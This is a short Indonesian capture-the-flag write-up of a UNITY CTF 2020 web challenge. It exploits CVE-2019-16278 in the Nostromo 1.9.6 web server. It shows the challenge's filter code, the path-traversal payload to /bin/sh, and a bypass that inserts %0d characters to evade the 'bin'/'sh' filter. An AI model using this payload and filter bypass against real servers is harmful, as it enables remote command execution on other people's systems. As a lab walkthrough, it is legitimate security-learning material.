---
title: WEB - [Stromeo] UNITY CTF
Kategori: "Web Exploitation"
year: "2020"
author: "sawontene."
published: true
---

# Web Exploitation (Author : sawontene.)

<p align="center">
  <img src="/web/stromeo-soal.png" alt="soal stromeo">
</p>

Diberikan sebuah link dan file httpd.zip. Setelah kami analisa terdapat clue pada header, dimana web tersebut menggunakan server **Nostromo 1.9.6** yang memiliki Vulnerability terhadap Remote Code Execution (CVE-2019-16278).

<p align="center">
  <img src="/web/nostromo.png" alt="nostromo">
</p>

Kami mencoba eksploitasi menggunakan [script python](https://github.com/sudohyak/exploit/blob/master/CVE-2019-16278/exploit.py) namun mendapat respon 400 Bad request.

Di dalam file **httpd.zip** terdapat file **http.c** dimana ketika kita menganalisa, request yang menggunakan kata **bin** dan **sh** akan di filter sehingga tidak bisa dieksploitasi.

```
/* check for valid uri */
if (strstr(header, "/../") != NULL || strstr(header, "bin") != NULL || strstr(header, "sh") != NULL) {
    h = http_head(http_s_400, line, cip, 0);
    b = http_body(http_s_400, "", h, 0);
    c[sfd].pfdo++;
    c[sfd].pfdn[hr] = 1;
    c[sfd].pfdh[hr] = strdup(b);
    c[sfd].x_ful[hr] = 1;
    c[sfd].x_chk[hr] = 0;
    c[sfd].x_sta = 0;
    free(h);
    free(b);
    return (0);
}
```

Kita coba membypass kondisi tersebut, dengan payload yang semula

`POST /.%0d./.%0d./.%0d./.%0d./bin/sh`

kemudian kita ubah payload **/bin/sh** dengan menambahkan **%0d** sehingga menjadi

`POST /.%0d./.%0d./.%0d./.%0d./b%0di%0dn/s%0dh`

dan setelah kita mencoba menjalankan script tersebut kembali, benar saja filter tersebut berhasil terbypass.

<p align="center">
  <img src="/web/nostromo-rce.png" alt="nostromo rce">
</p>

`Flag: UNITY2020{Bj1r_CVE-2019-16278_M00m3nt}` 
